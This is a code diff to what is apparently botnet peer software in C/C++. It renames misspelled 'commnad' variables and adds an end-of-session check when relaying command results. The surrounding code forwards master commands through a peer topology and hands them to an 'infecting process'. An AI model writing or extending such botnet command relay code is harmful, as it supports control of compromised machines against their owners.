@@ -17,7 +17,7 @@
 static SOCKET udp_sock;
 static SOCKET tcp_sock;
 static BotnetNode botnet_topology;
-static uint16_t master_commnad_id;
+static uint16_t master_command_id;
 /* init */
 /*
 * @purpose: Create basic sockets for communication operations.
@@ -137,7 +137,7 @@ static void handle_command(u_char* const data, const struct sockaddr_in& src_add
 	/* check if the command is intended for this machine */
 	if (command->dst_peer.ip + command->dst_peer.port + command->private_peer.ip + command->private_peer.port == 0)
 	{
-		master_commnad_id = command->numerics.id; // for retrieving the result
+		master_command_id = command->numerics.id; // for retrieving the result
 		send_command(data, BOTNET_PACK_SIZE); // send commnad to the infecting process
 	}
 	else // foward to next machine
@@ -316,17 +316,26 @@ void handle_ipc_results()
 	/* locals */
 	u_char buffer[900 + sizeof(struct botnet_pack)]; // commnad_result + botnet_pack
 	struct botnet_pack* p = (struct botnet_pack*)buffer;
-	u_char* commnad_result_section = buffer + sizeof(struct botnet_pack);
+	u_char* command_result_section = buffer + sizeof(struct botnet_pack);
 
 	while (1)
 	{
 		/* recv commnad result content (blocking) */
-		recv_result(commnad_result_section, 900);
+		recv_result(command_result_section, 900);
 		
 		/* add the currect id for retrieving the packet */
 		p->type = PACK_TYPE::COMMAND_RESULT;
-		p->numerics.id = master_commnad_id;
+		p->numerics.id = master_command_id;
+		p->act = 1;
 
+		/* check if end of session */
+		for (size_t i = 0; i < 900; i++)
+			if (command_result_section[i] != 0xff) // if all vars == 0xff
+			{
+				p->act = 0; // not the end
+				break; // exit for loop
+			}
+		
 		/* like any command given to the machine */
 		handle_command_result(buffer);
 	}
